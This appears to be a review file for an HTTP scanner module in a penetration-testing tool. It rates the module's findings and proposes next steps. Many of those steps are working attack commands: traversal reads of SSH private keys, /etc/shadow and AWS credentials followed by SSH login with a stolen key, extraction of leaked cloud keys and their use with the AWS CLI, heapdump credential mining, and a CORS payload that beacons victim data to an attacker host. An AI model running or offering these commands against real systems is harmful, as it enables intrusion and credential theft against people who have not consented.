summary: http.py is the stdlib-only deep HTTP scanner: path enum, framework fingerprint, actuator, methods, CORS, WebDAV shim, cache-poison, CRLF, open-redirect, nginx alias-traversal, JS secrets, backup variants. Most findings sit at T1 (deterministic-signal disclosure/misconfig) with two solid T2s (nginx alias traversal proves /etc/passwd read; JS secrets are extracted credential material). Biggest gap: no session/foothold step — actuator/env, JS secrets and default-cred hints (tomcat/grafana) never chain into an actual login attempt or heapdump-mining flow.

findings.tier_evidence: Bounded curated wordlist with catch-all suppression; a hit deterministically means the file responded 200/401/403 with a signature — same class as an ftp anon listing.
findings.promotion_notes: For high-value hits (.env, .aws/credentials, wp-config, terraform.tfstate, backup.sql) fetch body, run the loot/regex extractor and register captured secrets to the credential store — that turns disclosure into extracted material (T2).
findings.tester_next_step: curl -sSk http://IP:PORT/.git/HEAD ; for p in .env .aws/credentials terraform.tfstate backup.sql wp-config.php; do curl -sSk http://IP:PORT/$p | head -60; done ; if .git/HEAD present run: git-dumper http://IP:PORT/.git /tmp/gitdump && trufflehog filesystem /tmp/gitdump

findings.tier_evidence: Only fires on seed disclosure hits whose backup suffix returns non-catchall 200 — deterministic present/absent.
findings.promotion_notes: Grep the backup body for the loot patterns already in loot.py (_ENV_PASS_RE, _URL_CRED_RE) — same pathway as .env extraction.

findings.title_pattern: nginx alias-traversal — arbitrary file read via <path>
findings.tier_evidence: Probe returns /etc/passwd content matched by 'root:x:0:0:' — actual file read proven, not banner.
findings.promotion_notes: Chain a follow-up read of /root/.ssh/id_rsa, /home/*/.ssh/id_rsa, /var/www/*/.env, /root/.aws/credentials via the same primitive and hand the loot to the credential/SSH pivot.
findings.tester_next_step: for p in /root/.ssh/id_rsa /home/ubuntu/.ssh/id_rsa /var/www/.env /root/.aws/credentials /etc/shadow; do curl -sSk http://IP:PORT/static../$p ; done # if id_rsa lands: chmod 600 loot.key; ssh -i loot.key user@target

findings.tier_evidence: AWS/GitHub/Stripe/JWT regex hits are extracted material — the secret pattern IS the loot, not merely a fingerprint.
findings.promotion_notes: Register the matched string as a Credential (kind=api-token / kind=aws-key) so credential-spray and cloud-metadata probes can pivot to actual IAM enumeration.
findings.tester_next_step: SECRET=$(curl -sSk http://IP:PORT/bundle.js | grep -Eo 'AKIA[0-9A-Z]{16}|gh[oprs]_[A-Za-z0-9]{36,}|sk_live_[A-Za-z0-9]{20,}' | head -1) ; if [[ $SECRET == AKIA* ]]; then aws sts get-caller-identity --profile leaked ; fi

findings.tier_evidence: actuator_probe validates the response is a real hprof binary (>100KB) or JSON-shaped payload — a T2 confirmation for heapdump/env, T1 for surface-only paths.
findings.promotion_notes: Download heapdump, run `strings heap.hprof | grep -Ei 'password|secret|token|jdbc:'` and fold recovered creds into the credential store; POST /loggers/root=TRACE then read /actuator/logfile to capture live sessions.
findings.tester_next_step: curl -sSk http://IP:PORT/actuator/env | jq . ; curl -sSk -o heap.hprof http://IP:PORT/actuator/heapdump && strings heap.hprof | grep -Ei 'password|secret|jdbc:|Bearer ' | sort -u | head -80

findings.tier_evidence: TRACE echoed User-Agent — probe succeeds only when server actually reflects headers (deterministic).
findings.promotion_notes: XST is a client-side primitive; no meaningful server-side promotion.
findings.tester_next_step: curl -sSk -X TRACE -H 'X-Steal: canary' http://IP:PORT/ | grep -i x-steal

findings.tier_evidence: Only proves the verb is routed (baseline-diff), not that a write actually lands.
findings.promotion_notes: Add the PUT/GET/DELETE roundtrip that web/__init__.py._prove_put already does; a canary read-back confirms write. That is the promotion — same code, wired from http.py.
findings.tester_next_step: curl -sSk -X PUT --data 'recce-canary' http://IP:PORT/recce_probe.txt ; curl -sSk http://IP:PORT/recce_probe.txt ; curl -sSk -X DELETE http://IP:PORT/recce_probe.txt

findings.title_pattern: CORS reflects any origin with credentials
findings.tier_evidence: ACAO reflection + Allow-Credentials:true is a deterministic misconfig probe.
findings.promotion_notes: Client-side primitive — no promotion without a victim browser.
findings.tester_next_step: curl -sSk -H 'Origin: https://attacker.example' -D- http://IP:PORT/api/whoami | grep -i access-control ; host on evil.example a page that fetch(url,{credentials:'include'}).then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker/','..'+t))

findings.tier_evidence: Canary appearance confirms reflection; caching layer is unverified so it stays T1.
findings.promotion_notes: Add a cache-key discriminator (Age, X-Cache) check: a second identical request within 5s returning Age>0 with the poisoned body confirms cache poisoning (T2).
findings.tester_next_step: curl -sSk -H 'X-Forwarded-Host: attacker.recce' -D- http://IP:PORT/ ; sleep 2 ; curl -sSk -D- http://IP:PORT/ | grep -Ei 'age:|x-cache|attacker'

findings.tier_evidence: 207 multistatus response is a deterministic 'DAV enabled' signal.
findings.promotion_notes: Chain to services/webdav.py.anonymous_put_proof — proven write is T2, PUT+execute is T3.
findings.tester_next_step: curl -sSk -X PROPFIND -H 'Depth: 1' http://IP:PORT/webdav/ ; curl -sSk -X PUT --data 'x' http://IP:PORT/webdav/recce.txt && curl -sSk http://IP:PORT/webdav/recce.txt

findings.tier_evidence: 3xx Location leaking canary host is a deterministic primitive.
findings.promotion_notes: Client-side/phishing primitive; no server-side promotion without OAuth-flow context.

findings.title_pattern: CRLF header injection via URL parameter
findings.tier_evidence: Injected header appears in response — deterministic split.
findings.promotion_notes: Follow up with a Set-Cookie split (session fixation) or Location-header override; a cache-poison chain moves this to T2 when a shared cache is present.

findings.tier_evidence: Presence of a spec is surface enumeration; no exploitation on its own.
findings.promotion_notes: Parse spec, hit every unauth GET endpoint (already done in api.py) — that's the T1 promotion; fold api.py._spec_findings back through here.
findings.tester_next_step: curl -sSk http://IP:PORT/openapi.json | jq '.paths | keys[]' | head -40 ; for p in $(...); do curl -sSk -o /dev/null -w '%{http_code} %{url}\n' http://IP:PORT$p; done

findings.tier_evidence: autoindex markers match the actual HTML — deterministic.
findings.promotion_notes: Walk the listing, grep filenames for backup/config/dump patterns and download → captured content is T2.
Hand to sqli.py.test_form (already opt-in) for GET-parameter SQLi; that is a native T1 promotion.

findings.title_pattern: Login form with known default credentials: <path>
findings.tier_evidence: Hint only — no attempt is made.
findings.promotion_notes: Actually POST the hinted creds and check auth cookie return / redirect — a working default cred is T3 (foothold). Reuse web/auth.py:_form_login.
Feed disclosed version strings into offline CVE DB (known_products surface) — a version→CVE hit is a T1 candidate.
